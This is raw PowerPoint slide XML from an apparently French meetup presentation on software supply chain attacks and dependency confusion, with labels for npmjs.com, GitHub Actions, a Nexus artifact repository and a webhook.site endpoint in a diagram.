            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378"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9" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD0B1EE3-0B75-71F2-0975-A3BB67206273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2983302"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0" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FF6CCA8-9822-17B7-026C-B8E4A20C950A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5270226"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1" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{222F2DA7-4EA3-01EA-6572-25BE2BA803C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7557150"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23" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14DE835D-AEEA-9024-0C6C-E33AB13F7B1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6545603" y="4160494"/>
            <a:ext cx="360000" cy="3593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Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E384E84D-A866-8821-5661-9158148958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26" name="Nuage 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95C94FBA-D78F-B992-4290-F90726B610D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796118" y="304956"/>
            <a:ext cx="7395882" cy="287121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D5FC046C-A840-4AA5-F27C-908077766201}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378" y="3319615"/>
            <a:ext cx="10875694"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A1DB742D-1D77-160D-7D4B-4D00C049810A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1258737"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Public repositories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1F58C00-6975-1811-4EFB-5D8F411A1FF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755715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31" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29829A64-D2D0-2417-77BB-54DDB5926A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a:xfrm>
            <a:off x="472251" y="349793"/>
            <a:ext cx="11016000" cy="257220"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Le périmètre et les technos de ce meetup 2/2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="ZoneTexte 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BEF6735-DB9E-FCAE-86FB-A5E1A3C13258}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4028536"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Nexus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="ZoneTexte 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17BCE7EA-6D03-5781-F5DB-C7F35713AA75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281842" y="4054288"/>
            <a:ext cx="1535517" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>GitHub actions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="ZoneTexte 41">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00E746E7-6ECE-9DDF-C858-4D96C1B39B44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3010663" y="4073153"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GiHub</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="ZoneTexte 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B905B87-A304-88D7-8883-8141D35238D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1683858"/>
            <a:ext cx="1091060" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>npmjs.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="ZoneTexte 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EB9B24B-90D0-E000-2BDB-ADB44D7F0F4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3081463" y="5461896"/>
            <a:ext cx="6105524" cy="738664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Accolade ouvrante 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DD4C400-1D23-3934-7D5A-121F74798C46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287865" y="3436287"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 23855"/>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fermante 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31EC86B3-E263-09CC-3635-678F311EA614}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9244181" y="3429000"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 2597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2" name="Picture 8" descr="npm Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8948DBDF-686A-9810-091F-ED575D3646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5827" y="1995715"/>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onatype Nexus - Opsera">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{753B9988-C5B2-A130-1A74-7E62D3D4BC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1032" y="435575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Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04756EF9-4BEE-53D4-B5EE-336F3A0F2448}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="983299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7" name="ZoneTexte 26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E2B2E54-4647-7FE2-2C8C-BB4B5B696E44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9847558" y="1264376"/>
            <a:ext cx="1728000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https://webhook.site</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="44" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15CADC20-9A35-A0C4-30A1-DF79607A5B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1108942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919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DD5CAEAC-5FF1-49A9-FB33-1EB6EC934451}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>Artifact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t> repository</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 2" descr="Laptop - Free computer icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0A7F49D-CEDA-A69C-E795-2E0B1BB9A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907" y="398018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Computer User Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA229DC-64A1-3C28-0A67-A9E668AB01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996" y="3928753"/>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12" name="ZoneTexte 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2510B108-4448-584B-98DE-4F0FEBAF8C7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="708995" y="3608499"/>
            <a:ext cx="162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sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E64E33E5-899D-9422-4876-21845D2182DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378"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1" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{222F2DA7-4EA3-01EA-6572-25BE2BA803C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7557150" y="3596046"/>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24" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E384E84D-A866-8821-5661-9158148958A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4160494"/>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26" name="Nuage 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95C94FBA-D78F-B992-4290-F90726B610D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796118" y="304956"/>
            <a:ext cx="7395882" cy="2871219"/>
          </a:xfrm>
          <a:prstGeom prst="cloud">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D5FC046C-A840-4AA5-F27C-908077766201}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378" y="3319615"/>
            <a:ext cx="10875694"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A1DB742D-1D77-160D-7D4B-4D00C049810A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1258737"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Public repositories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1F58C00-6975-1811-4EFB-5D8F411A1FF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755715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31" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29829A64-D2D0-2417-77BB-54DDB5926A3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883390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a:xfrm>
            <a:off x="472251" y="349793"/>
            <a:ext cx="11016000" cy="257220"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Dependency</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> confusion 1/2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="ZoneTexte 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BEF6735-DB9E-FCAE-86FB-A5E1A3C13258}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4028536"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Nexus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="ZoneTexte 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B905B87-A304-88D7-8883-8141D35238D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1683858"/>
            <a:ext cx="1091060" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>npmjs.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="ZoneTexte 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EB9B24B-90D0-E000-2BDB-ADB44D7F0F4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3081463" y="5461896"/>
            <a:ext cx="6105524" cy="738664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Accolade ouvrante 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DD4C400-1D23-3934-7D5A-121F74798C46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287865" y="3436287"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 23855"/>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Accolade fermante 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31EC86B3-E263-09CC-3635-678F311EA614}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9244181" y="3429000"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 25972"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 8" descr="npm Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8948DBDF-686A-9810-091F-ED575D3646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5827" y="1995715"/>
            <a:ext cx="360000" cy="360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Sonatype Nexus - Opsera">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{753B9988-C5B2-A130-1A74-7E62D3D4BC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1032" y="4355759"/>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5" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D704203-6E72-7AD1-8B77-DF4FEA5868D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9832990" y="1246284"/>
            <a:ext cx="17280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6" name="ZoneTexte 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A29F787B-7C35-3B70-4815-16F0E2402E26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9847558" y="1264376"/>
            <a:ext cx="1728000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https://webhook.site</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F629A649-B599-EE4A-F9AB-18E77B5F792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334" t="7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="11089427" y="1810732"/>
            <a:ext cx="360000" cy="359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930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8" name="Connecteur droit 1057">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01932A5B-5AAB-EBA2-DD49-6C010374ABC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3319268" y="4570995"/>
            <a:ext cx="0" cy="1296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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Dependency</a:t>
            </a:r>
            <a:r>
